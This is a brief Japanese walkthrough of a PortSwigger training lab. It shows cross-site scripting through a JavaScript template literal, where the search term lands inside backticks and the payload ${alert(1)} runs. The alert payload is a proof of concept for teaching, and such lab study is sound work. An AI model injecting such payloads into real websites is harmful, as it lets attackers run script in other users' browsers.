# テンプレート リテラルを使用した XSS の埋め込み

以下のハッキングラボを実施します

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped

- 1. ハッキングラボにアクセスします
- 2. 任意のワードで検索します
- 3. 検索結果ページのソースコードを確認

```html
<script>
  var message = `0 search results for 'abc'`;
  document.getElementById("searchMessage").innerText = message;
</script>
```

- 4. 次のテンプレートリテラルで検索するとスクリプトが実行されることが確認できます

```js
${alert(1)}
```

```html
<script>
  var message = `0 search results for '${alert(1)}'`;
  document.getElementById("searchMessage").innerText = message;
</script>
```
